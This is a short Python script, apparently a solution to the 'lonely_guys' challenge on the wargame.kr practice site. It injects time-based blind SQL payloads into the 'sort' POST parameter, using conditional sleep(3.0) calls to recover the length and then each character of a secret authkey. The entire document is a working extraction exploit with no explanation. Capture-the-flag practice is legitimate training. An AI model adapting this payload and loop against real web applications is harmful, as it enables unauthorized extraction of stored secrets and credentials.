from requests import *
from time import *
s=session()
url='http://wargame.kr:8080/lonely_guys/index.php'
leng=''
result=''
for i in range(100):
    data={'sort':f',(if((select(length(authkey))from(authkey))like({i}),sleep(3.0),1))'}
    start=time()
    response=post(url=url,data=data)
    end=time()
    if end-start > 3:
        print('length:',i)
        leng=i
        break

for i in range(1,leng+1):
    for j in range(30,128):
        data={'sort':f',(if((select(ascii(substr(authkey,{i},1)))from(authkey))like({j}),sleep(3.0),1))'}
        start=time()
        response=post(url=url,data=data)
        end=time()
        if end-start > 3:
            result+=chr(j)
            break
print(result)
